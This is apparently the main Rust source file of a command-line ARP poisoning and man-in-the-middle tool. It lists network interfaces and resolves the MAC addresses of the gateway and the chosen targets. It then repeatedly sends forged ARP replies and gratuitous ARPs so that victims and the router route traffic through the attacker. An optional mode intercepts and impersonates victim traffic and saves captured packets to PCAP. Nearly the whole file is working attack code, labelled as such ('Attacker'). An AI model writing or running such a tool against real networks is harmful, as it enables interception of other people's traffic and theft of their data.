use anyhow::{anyhow, Context, Result};
use clap::Parser;
use pnet::datalink::{self, Channel};
use pnet::util::MacAddr;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

mod arp;
mod mitm;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// List available network interfaces and exit
    #[arg(short, long)]
    list: bool,

    /// Network interface to use (e.g. eth0, wlan0)
    #[arg(short, long, required_unless_present = "list")]
    interface: Option<String>,

    /// Target IP(s) to spoof. Use multiple times or comma-separated.
    /// Example: -t 192.168.1.10,192.168.1.20
    #[arg(short, long, value_delimiter = ',', num_args = 1.., required_unless_present = "list")]
    targets: Option<Vec<String>>,

    /// Gateway IP (router) to impersonate
    #[arg(short, long, required_unless_present = "list")]
    gateway: Option<String>,

    /// Spoofing interval in seconds
    #[arg(long, default_value_t = 2)]
    interval: u64,

    /// ARP resolution timeout per attempt in seconds
    #[arg(long, default_value_t = 3)]
    arp_timeout: u64,

    /// Enable packet-level MITM: intercept victim traffic and spoof attacker identity via TUN
    /// (Linux only)
    #[arg(short, long)]
    mitm: bool,

    /// Which target IP to impersonate in MITM mode. Required when multiple targets are given.
    #[arg(long, value_name = "IP")]
    impersonate: Option<String>,

    /// Save captured packets to a PCAP file (use with --mitm)
    #[arg(long, value_name = "PATH")]
    pcap: Option<String>,

    /// Restore mode: send correct ARP mappings to undo a previous poisoning session
    #[arg(short, long)]
    restore: bool,

    /// Enable verbose packet logging
    #[arg(short, long)]
    debug: bool,
}

fn main() {
    println!(
        r#"
   ____ _                 _  ___               ____             _    _
  / ___| | ___  _   _  __| |/ _ \ _ __  ___   / ___| _   _  ___| |/ /| |
 | |   | |/ _ \| | | |/ _` | | | | '_ \/ __|  \___ \| | | |/ __| ' / | |
 | |___| | (_) | |_| | (_| | |_| | |_) \__ \   ___) | |_| | (__|  <  |_|
  \____|_|\___/ \__,_|\__,_|\___/| .__/|___/  |____/ \__,_|\___|_|\_\(_)
                                 |_|
    "#
    );

    if let Err(e) = run() {
        eprintln!("Error: {:#}", e);
        std::process::exit(1);
    }
}

fn run() -> Result<()> {
    let args = Args::parse();
    let interfaces = datalink::interfaces();

    if args.list {
        println!("{:<45} {:<20} {}", "NAME", "MAC", "DESCRIPTION");
        println!("{}", "-".repeat(100));
        for iface in &interfaces {
            let mac = iface
                .mac
                .map(|m| m.to_string())
                .unwrap_or_else(|| "N/A".to_string());
            println!("{:<45} {:<20} {}", iface.name, mac, iface.description);
        }
        return Ok(());
    }

    let interface_name = args.interface.as_ref().unwrap();

    let target_ips: Vec<Ipv4Addr> = args
        .targets
        .as_ref()
        .unwrap()
        .iter()
        .map(|t| {
            t.parse::<Ipv4Addr>()
                .with_context(|| format!("Invalid target IP: '{}'", t))
        })
        .collect::<Result<_>>()?;

    let gateway_ip: Ipv4Addr = args
        .gateway
        .as_ref()
        .unwrap()
        .parse()
        .context("Invalid gateway IP")?;

    let iface = interfaces
        .iter()
        .find(|i| i.name == *interface_name)
        .ok_or_else(|| anyhow!("Interface '{}' not found", interface_name))?;

    let my_mac = iface
        .mac
        .ok_or_else(|| anyhow!("Interface '{}' has no MAC address", interface_name))?;

    let my_ip = iface
        .ips
        .iter()
        .find(|ip| ip.is_ipv4())
        .map(|ip| match ip.ip() {
            std::net::IpAddr::V4(v4) => v4,
            _ => unreachable!(),
        })
        .ok_or_else(|| anyhow!("Interface '{}' has no IPv4 address", interface_name))?;

    let config = datalink::Config {
        read_timeout: Some(Duration::from_secs(args.arp_timeout)),
        ..Default::default()
    };

    let (mut tx, mut rx) = match datalink::channel(iface, config) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => {
            return Err(anyhow!(
                "Unsupported channel type for interface '{}'",
                interface_name
            ))
        }
        Err(e) => {
            return Err(anyhow!(
                "Failed to open channel on '{}': {}",
                interface_name,
                e
            ))
        }
    };

    println!("=== Configuration ===");
    println!(
        "Interface: {} | My IP: {} | My MAC: {}",
        iface.name, my_ip, my_mac
    );
    println!("Gateway:   {}", gateway_ip);
    println!("Targets:   {:?}", target_ips);
    println!(
        "Mode:      {}",
        if args.restore {
            "RESTORE"
        } else if args.mitm {
            "MITM + SPOOF"
        } else {
            "POISON"
        }
    );
    println!("=====================\n");

    // Resolve gateway MAC
    print!("Resolving gateway {}... ", gateway_ip);
    let gateway_mac = arp::resolve_mac(&mut tx, &mut rx, gateway_ip, my_mac, my_ip)
        .with_context(|| format!("Could not resolve MAC for gateway {}", gateway_ip))?;
    println!("{}", gateway_mac);

    // Resolve target MACs
    let mut targets: Vec<(Ipv4Addr, MacAddr)> = Vec::new();
    for ip in target_ips {
        print!("Resolving target {}... ", ip);
        match arp::resolve_mac(&mut tx, &mut rx, ip, my_mac, my_ip) {
            Ok(mac) => {
                println!("{}", mac);
                targets.push((ip, mac));
            }
            Err(e) => eprintln!("skipped ({})", e),
        }
    }

    if targets.is_empty() {
        return Err(anyhow!("No target MACs could be resolved. Aborting."));
    }

    // ── Restore mode ──────────────────────────────────────────────────────────
    if args.restore {
        println!("\nRestoring ARP caches...");
        arp::restore_arp(&mut tx, &targets, gateway_ip, gateway_mac, args.debug);
        println!("Done.");
        return Ok(());
    }

    // ── Shared Ctrl+C flag ────────────────────────────────────────────────────
    let running = Arc::new(AtomicBool::new(true));
    let flag = running.clone();
    ctrlc::set_handler(move || flag.store(false, Ordering::SeqCst))
        .context("Failed to install Ctrl-C handler")?;

    // ── MITM mode ─────────────────────────────────────────────────────────────
    if args.mitm {
        let impersonate = if targets.len() == 1 {
            targets[0]
        } else {
            let ip_str = args
                .impersonate
                .as_ref()
                .ok_or_else(|| anyhow!("Multiple targets: specify --impersonate <ip>"))?;
            let ip: Ipv4Addr = ip_str
                .parse()
                .context("Invalid --impersonate IP")?;
            *targets
                .iter()
                .find(|&&(t, _)| t == ip)
                .ok_or_else(|| anyhow!("--impersonate {} is not in the targets list", ip))?
        };

        // Send initial gratuitous ARP before handing off tx/rx to MITM threads
        println!("Sending initial gratuitous ARP...");
        if let Some(pkt) = arp::build_gratuitous_arp(my_mac, gateway_ip) {
            let _ = tx.send_to(&pkt, None);
        }
        for &(target_ip, _) in &targets {
            if let Some(pkt) = arp::build_gratuitous_arp(my_mac, target_ip) {
                let _ = tx.send_to(&pkt, None);
            }
        }

        return mitm::run_mitm(
            tx,
            rx,
            &targets,
            gateway_ip,
            gateway_mac,
            impersonate,
            my_mac,
            args.interval,
            args.pcap.as_deref(),
            args.debug,
            running,
        );
    }

    // ── Poison-only mode ──────────────────────────────────────────────────────
    println!("\n--- Starting ARP Poisoning ---");
    println!("Attacker: {} ({})", my_ip, my_mac);
    println!("Gateway:  {} ({})", gateway_ip, gateway_mac);
    for (ip, mac) in &targets {
        println!("Target:   {} ({})", ip, mac);
    }
    println!("Press Ctrl+C to stop and restore caches.\n");

    println!("Sending initial gratuitous ARP...");
    if let Some(pkt) = arp::build_gratuitous_arp(my_mac, gateway_ip) {
        let _ = tx.send_to(&pkt, None);
    }
    for &(target_ip, _) in &targets {
        if let Some(pkt) = arp::build_gratuitous_arp(my_mac, target_ip) {
            let _ = tx.send_to(&pkt, None);
        }
    }

    while running.load(Ordering::SeqCst) {
        for &(target_ip, target_mac) in &targets {
            if let Some(pkt) = arp::build_arp_reply(target_mac, target_ip, my_mac, gateway_ip) {
                match tx.send_to(&pkt, None) {
                    Some(Ok(_)) => {
                        if args.debug {
                            println!("[+] → {}: {} is at {}", target_ip, gateway_ip, my_mac);
                        }
                    }
                    Some(Err(e)) => eprintln!("Send error (target {}): {}", target_ip, e),
                    None => eprintln!("Send error (target {}): channel returned None", target_ip),
                }
            }
            if let Some(pkt) = arp::build_arp_reply(gateway_mac, gateway_ip, my_mac, target_ip) {
                match tx.send_to(&pkt, None) {
                    Some(Ok(_)) => {
                        if args.debug {
                            println!("[+] → gateway: {} is at {}", target_ip, my_mac);
                        }
                    }
                    Some(Err(e)) => eprintln!("Send error (gateway re {}): {}", target_ip, e),
                    None => eprintln!("Send error (gateway): channel returned None"),
                }
            }
        }

        let deadline = Instant::now() + Duration::from_secs(args.interval);
        while Instant::now() < deadline && running.load(Ordering::SeqCst) {
            thread::sleep(Duration::from_millis(100));
        }
    }

    println!("\nStopped. Restoring ARP caches...");
    arp::restore_arp(&mut tx, &targets, gateway_ip, gateway_mac, args.debug);
    println!("Done. Exiting cleanly.");

    Ok(())
}
